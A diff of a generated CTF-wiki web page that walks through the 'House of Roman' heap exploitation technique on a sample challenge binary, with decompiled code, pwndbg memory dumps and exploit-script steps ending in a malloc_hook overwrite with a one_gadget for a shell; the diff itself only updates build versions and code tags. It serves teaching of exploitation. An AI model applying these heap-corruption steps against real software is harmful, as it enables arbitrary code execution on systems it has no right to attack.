@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4716,16 +4716,16 @@
 </ol>
 <p>First a rough analysis of the demo:</p>
 <p>Open protection:</p>
-<div class="codehilite"><pre><span></span><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      PIE enabled
-</pre></div>
+</code></pre></div>
 
 <p>There are three main functions in the sample question, Malloc, Write, and Free.</p>
-<div class="codehilite"><pre><span></span>    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
+<div class="codehilite"><pre><span></span><code>    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
     <span class="p">{</span>
       <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
         <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Malloc&quot;</span><span class="p">);</span>
@@ -4744,10 +4744,10 @@
       <span class="k">default</span><span class="o">:</span>
         <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Invalid choice&quot;</span><span class="p">);</span>
         <span class="k">break</span><span class="p">;</span>
-</pre></div>
+</code></pre></div>
 
 <p>In the Free function, there is a dangling pointer caused by the pointer not being zeroed.</p>
-<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">free_chunk</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="nf">free_chunk</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]@1</span>
 
@@ -4757,21 +4757,21 @@
   <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&lt;=</span> <span class="mh">0x13</span> <span class="p">)</span>
     <span class="n">free</span><span class="p">(</span><span class="n">heap_ptrs</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">v0</span><span class="p">]);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="first-step">First step<a class="headerlink" href="#first-step" title="Permanent link">&para;</a></h3>
 <p>First fake a chunk, the size of the chunk is 0x61. Then we use partial overwrite to point the FD to the forged chunk (of course, we can also do this with UAF).</p>
 <p>Forged chunk size</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt;
+<div class="codehilite"><pre><span></span><code>pwndbg&gt;
 0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141
 0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141
 0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141
 0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141
 0x555555757090: 0x41414141      0x41414141      0x61    0x0     &lt;----------
-</pre></div>
+</code></pre></div>
 
 <p>Here, we are free of chunk 1, this time we can get an unsortbin</p>
-<div class="codehilite"><pre><span></span>0x555555757020 PREV_INUSE {
+<div class="codehilite"><pre><span></span><code>0x555555757020 PREV_INUSE {
   prev_size = 0x0,
   size = 0xd1,
   fd = 0x7ffff7dd1b58 &lt;main_arena+88&gt; ,
@@ -4779,10 +4779,10 @@
   fd_nextsize = 0x4141414141414141,
   bk_nextsize = 0x4141414141414141
 }
-</pre></div>
+</code></pre></div>
 
 <p>Next, we redistribute the chunk 0xd1 and modify its size to 0x71.</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt; x/40ag 0x555555757020
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; x/40ag 0x555555757020
 0x555555757020: 0x4141414141414141      0x71
 0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;
 0x555555757040: 0x4141414141414141      0x4141414141414141
@@ -4791,10 +4791,10 @@
 0x555555757070: 0x4141414141414141      0x4141414141414141
 0x555555757080: 0x4141414141414141      0x4141414141414141
 0x555555757090: 0x4141414141414141      0x61
-</pre></div>
+</code></pre></div>
 
 <p>We then need to fix this 0x71 FD freelist and fake it as a block that has already been released.</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt; x/40ag 0x555555757000
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; x/40ag 0x555555757000
 0x555555757000: 0x0     0x21
 0x555555757010: 0x4141414141414141      0x4141414141414141
 0x555555757020: 0x4141414141414141      0x71       &lt;----------  free 0x71
@@ -4815,10 +4815,10 @@
 0x555555757110: 0x0     0x0
 0x555555757120: 0x0     0x0
 0x555555757130: 0x0     0x0
-</pre></div>
+</code></pre></div>
 
-<div class="codehilite"><pre><span></span>libc : 0x7ffff7a23d28 (&quot;malloc_hook&quot;)
-</pre></div>
+<div class="codehilite"><pre><span></span><code>libc : 0x7ffff7a23d28 (&quot;malloc_hook&quot;)
+</code></pre></div>
 
 <p>At this time our FD is already near the malloc hook and is not ready for blasting.</p>
 <h3 id="_1">第二步<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
@@ -4827,7 +4827,7 @@
 <p>Take advantage of unsortebin's attacking techniques and use the editing function to write onegadet.</p>
 <h2 id="exp">分析exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
 <p>Assign <code>3</code> <code>chunk</code>, set <code>p64(0x61)</code> at <code>B + 0x78</code>, the function is <code>fake size</code> for the following <code>fastbin attack</code></p>
-<div class="codehilite"><pre><span></span><span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 0x20</span>
+<div class="codehilite"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 0x20</span>
 <span class="n">create</span><span class="p">(</span><span class="mh">0xc8</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># d0</span>
 <span class="n">create</span><span class="p">(</span><span class="mh">0x65</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># 0x70</span>
 
@@ -4836,10 +4836,10 @@
 <span class="n">fake</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>  <span class="c1">## fake size</span>
 <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">fake</span><span class="p">)</span>
 <span class="n">info</span><span class="p">(</span><span class="s2">&quot;fake&quot;</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>Release <code>B</code> and assign the same size again to <code>B</code>, where <code>B+0x10</code> and <code>B+0x18</code> have the address of <code>main_arean</code>. Assign <code>3</code> <code>fastbin</code> and <code>off by one</code> to modify <code>B-&gt;size = 0x71</code></p>
-<div class="codehilite"><pre><span></span>free(1)
+<div class="codehilite"><pre><span></span><code>free(1)
 create(0xc8,1)
 
 create(0x65,3)  # b
@@ -4850,19 +4850,19 @@ over = &quot;A&quot;*0x18  # off by one
 over += &quot;\x71&quot;  # set chunk  1&#39;s size --&gt; 0x71
 edit(0,over)
 info(&quot;use off by one ,  chunk  1&#39;s size --&gt; 0x71&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>Generate two <code>fastbin</code>s, then use <code>uaf</code> to write some addresses and chain <code>B</code> to <code>fastbin</code></p>
-<div class="codehilite"><pre><span></span><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
 <span class="n">info</span><span class="p">(</span><span class="s2">&quot;Create two 0x70 fastbin&quot;</span><span class="p">)</span>
 <span class="n">heap_po</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x20</span><span class="s2">&quot;</span>
 <span class="n">edit</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">heap_po</span><span class="p">)</span>
 <span class="n">info</span><span class="p">(</span><span class="s2">&quot;Link chunk&#39;1 into fastbin&quot;</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>Debug to see the status of <code>fastbin</code> at this time</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt; fastbins 
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; fastbins 
 fastbins
 0x20: 0x0
 0x30: 0x0
@@ -4871,32 +4871,32 @@ fastbins
 0x60: 0x0
 0x70: 0x555555757160 —▸ 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x7ffff7dd1b78
 0x80: 0x0
-</pre></div>
+</code></pre></div>
 
 <blockquote>
 <p><code>0x555555757020</code> is <code>chunk B</code></p>
 </blockquote>
 <p>Then by modifying the low <code>2</code> bytes of <code>B-&gt;fd</code>, make <code>B-&gt;fd= malloc_hook - 0x23</code></p>
-<div class="codehilite"><pre><span></span># malloc_hook above
+<div class="codehilite"><pre><span></span><code># malloc_hook above
 malloc_hook_nearly = &quot;\xed\x1a&quot;
 edit(1,malloc_hook_nearly)
 info(&quot;Partial write, modify fastbin-&gt;fd ---&gt; malloc_hook&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>Then allocate <code>3</code> <code>`xk</code> of <code>0x70</code>, and you can get the <code>chunk</code> where <code>malloc_hook</code> is located.</p>
-<div class="codehilite"><pre><span></span>create(0x65,0)
+<div class="codehilite"><pre><span></span><code>create(0x65,0)
 create(0x65,0)
 create(0x65,0)
-</pre></div>
+</code></pre></div>
 
 <p>Then <code>free</code> drop <code>E</code>, enter <code>fastbin</code>, use <code>uaf</code> to set <code>E-&gt;fd = 0</code>, fix <code>fastbin</code></p>
-<div class="codehilite"><pre><span></span>free(15)
+<div class="codehilite"><pre><span></span><code>free(15)
 edit(15,p64(0x00))
 info(&quot;Generate 0x71 fastbin again, modify fd =0, fix fastbin&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>Then an unsorted bin attack, making the value of malloc_hook main_arena+88</p>
-<div class="codehilite"><pre><span></span>create(0xc8,1)
+<div class="codehilite"><pre><span></span><code>create(0xc8,1)
 create(0xc8,1)
 create(0x18,2)
 create(0xc8,3)
@@ -4907,20 +4907,20 @@ po + = &quot;\x00\x1b&quot;
 edit (1, po)
 create(0xc8,1)
 info(&quot;unsorted bin makes malloc_hook have the address of libc&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>Make the <code>malloc_hook</code> address of <code>one_gadget</code> by modifying the lower three bytes of <code>malloc_hook</code></p>
-<div class="codehilite"><pre><span></span>over = &quot;R&quot;*0x13   # padding for malloc_hook
+<div class="codehilite"><pre><span></span><code>over = &quot;R&quot;*0x13   # padding for malloc_hook
 over + = &quot;\xa4\xd2\xaf&quot;
 edit(0,over)
 
 info(&quot;malloc_hook to one_gadget&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>Then <code>free</code> twice with the same <code>chunk</code>, trigger <code>malloc_printerr</code> , <code>getshell</code></p>
-<div class="codehilite"><pre><span></span>free(18)
+<div class="codehilite"><pre><span></span><code>free(18)
 free(18)
-</pre></div>
+</code></pre></div>
 
 <h2 id="link">link<a class="headerlink" href="#link" title="Permanent link">&para;</a></h2>
 <p><a href="https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc">https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc</a></p>
@@ -4991,7 +4991,7 @@ free(18)
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5006,7 +5006,7 @@ free(18)
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
